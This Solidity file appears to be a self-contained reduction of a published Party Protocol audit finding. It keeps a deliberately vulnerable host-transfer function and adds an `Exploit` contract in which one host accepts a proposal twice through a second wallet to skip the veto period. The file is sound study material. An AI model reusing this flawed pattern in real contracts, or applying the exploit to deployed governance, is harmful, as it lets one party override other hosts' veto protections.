// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Party Protocol — [H-02] Single host can unfairly skip veto period for a
    proposal that does not have full host support (Code4rena 2023-10-party,
    finding #29546, reporter 3docSec).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: `abdicateHost` lets any host transfer their host status to a
    NEW address at any time, with no snapshot of who was a host when the
    proposal was created:

        function abdicateHost(address newPartyHost) external {   // @> VULN
            _assertHost();
            if (newPartyHost != address(0)) {
                if (isHost[newPartyHost]) revert InvalidNewHostError();
                isHost[newPartyHost] = true;
            } else {
                --numHosts;
            }
            isHost[msg.sender] = false;
        }

    A single host can `accept` a proposal (counting toward the
    `numHostsAccepted` threshold), abdicate their host status to a second
    wallet they also control, and `accept` AGAIN from that second wallet —
    repeating until `numHostsAccepted == numHosts`, skipping the veto period
    even though the OTHER genuine host never accepted.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced Party governance. Keeps the verbatim `abdicateHost` host
///         transfer and a minimal accept/veto-skip mechanism.
contract PartyGovernance {
    error InvalidNewHostError();

    enum ProposalStatus {
        Invalid,
        Passed, // vote threshold met; veto period active until all hosts accept
        Ready // all hosts have accepted; veto period skipped, ready to execute
    }

    mapping(address => bool) public isHost;
    uint16 public numHosts;

    mapping(uint256 => ProposalStatus) public proposalStatus;
    mapping(uint256 => uint16) public numHostsAccepted;
    mapping(uint256 => mapping(address => bool)) public hostAccepted;

    constructor(address host1, address host2) {
        isHost[host1] = true;
        isHost[host2] = true;
        numHosts = 2;
    }

    /// @dev Simplified stand-in for a proposal reaching its normal
    ///      (non-host) voting-power threshold — irrelevant to this bug.
    function propose(uint256 proposalId) external {
        proposalStatus[proposalId] = ProposalStatus.Passed;
    }

    /// @notice Verbatim reduction of PartyGovernance.abdicateHost
    ///         (PartyGovernance.sol#L457-L474). Transfers host status to
    ///         ANOTHER address the caller controls, with no restriction on
    ///         WHEN this can happen relative to any in-flight proposal.
    function abdicateHost(address newPartyHost) external {
        _assertHost();
        // @> VULN: no snapshot of who was a host at proposal-creation time —
        // host status can be freely moved between wallets the same actor controls
        if (newPartyHost != address(0)) {
            if (isHost[newPartyHost]) {
                revert InvalidNewHostError();
            }
            isHost[newPartyHost] = true;
        } else {
            --numHosts;
        }
        isHost[msg.sender] = false;
    }

    function _assertHost() internal view {
        require(isHost[msg.sender], "not a host");
    }

    /// @notice Reduced accept(): a CURRENT host accepts a proposal. Once
    ///         `numHostsAccepted == numHosts`, the veto period is skipped
    ///         (status -> Ready) — with no check on WHICH addresses provided
    ///         those accepts, only a running count.
    function accept(uint256 proposalId) external {
        _assertHost();
        require(!hostAccepted[proposalId][msg.sender], "already accepted");
        hostAccepted[proposalId][msg.sender] = true;
        numHostsAccepted[proposalId] += 1;
        if (numHostsAccepted[proposalId] >= numHosts) {
            proposalStatus[proposalId] = ProposalStatus.Ready; // veto period skipped
        }
    }
}

/// @dev The genuine, HONEST second host (Bob). Never accepts the malicious
///      proposal — represents the host whose veto-window protection is
///      bypassed.
contract HonestHost {}

/// @dev A second wallet the malicious host (Alice) also controls. Used to
///      accept AGAIN after abdicating host status to it.
contract AliceAltWallet {
    function acceptAsAlt(PartyGovernance game, uint256 proposalId) external {
        game.accept(proposalId);
    }
}

/// @notice Attacker (host "Alice") orchestrator. Deploys the reduced Party
///         governance, accepts a proposal once as the original host, then
///         abdicates host status to a second wallet it also controls and
///         accepts AGAIN — skipping the veto period even though the OTHER
///         genuine host (Bob) never accepted.
contract Exploit {
    uint256 public constant PROPOSAL_ID = 1;

    HonestHost public bob; // nonce 1
    PartyGovernance public game; // nonce 2 — vulnerable
    AliceAltWallet public aliceAlt; // nonce 3

    constructor() {
        bob = new HonestHost(); // CREATE nonce 1
        game = new PartyGovernance(address(this), address(bob)); // CREATE nonce 2 — Alice (this) + Bob are the two hosts
        aliceAlt = new AliceAltWallet(); // CREATE nonce 3
    }

    function run() external {
        game.propose(PROPOSAL_ID);
        require(game.proposalStatus(PROPOSAL_ID) == PartyGovernance.ProposalStatus.Passed, "setup: proposal not passed");

        // Alice (the ONLY host who ever accepts) accepts once.
        game.accept(PROPOSAL_ID);
        require(game.numHostsAccepted(PROPOSAL_ID) == 1, "setup: expected 1 accept");
        require(
            game.proposalStatus(PROPOSAL_ID) == PartyGovernance.ProposalStatus.Passed,
            "setup: veto period should still be active (Bob has not accepted)"
        );

        // Alice abdicates her host status to a SECOND wallet she also controls.
        game.abdicateHost(address(aliceAlt));
        require(!game.isHost(address(this)), "setup: Alice should no longer be a host");
        require(game.isHost(address(aliceAlt)), "setup: aliceAlt should now be a host");
        require(game.numHosts() == 2, "setup: numHosts unchanged");

        // Alice's ALT wallet accepts AGAIN — Bob (the only OTHER genuine host)
        // never accepted at all.
        aliceAlt.acceptAsAlt(game, PROPOSAL_ID);

        // HARM: the veto period is skipped even though only ONE real host
        // (Alice, wearing two hats) ever accepted — Bob's veto protection was
        // bypassed entirely.
        require(game.numHostsAccepted(PROPOSAL_ID) == 2, "harm setup failed: expected 2 accepts recorded");
        require(!game.hostAccepted(PROPOSAL_ID, address(bob)), "harm not demonstrated: Bob never accepted");
        require(
            game.proposalStatus(PROPOSAL_ID) == PartyGovernance.ProposalStatus.Ready,
            "harm not demonstrated: veto period should have been skipped"
        );
    }
}
